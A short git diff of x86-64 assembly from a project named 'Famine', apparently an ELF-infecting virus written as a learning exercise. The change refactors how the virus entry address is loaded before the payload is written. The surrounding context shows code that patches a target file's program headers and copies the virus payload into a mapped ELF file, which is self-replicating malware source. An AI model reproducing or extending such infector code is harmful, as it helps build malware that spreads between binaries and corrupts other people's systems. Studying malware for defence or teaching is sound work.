@@ -13,10 +13,6 @@ section .text
         mov rbp, rsp
         sub rbp, Famine_size            ; allocate Famine struct on stack
 
-        ; load virus entry
-        lea rax, _start
-        mov VAR(Famine.virus_entry), rax
-
         ; load virus size
         lea rax, _start
         lea rbx, _finish
@@ -265,7 +261,7 @@ section .text
         mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
     
     .write_payload:
-        mov rsi, VAR(Famine.virus_entry)
+        lea rsi, _start
         mov rdi, VAR(Famine.mmap_ptr)
         add rdi, VAR(Famine.virus_offset)
         ; nos guardamos el address del mmap que se corresponde con el principio
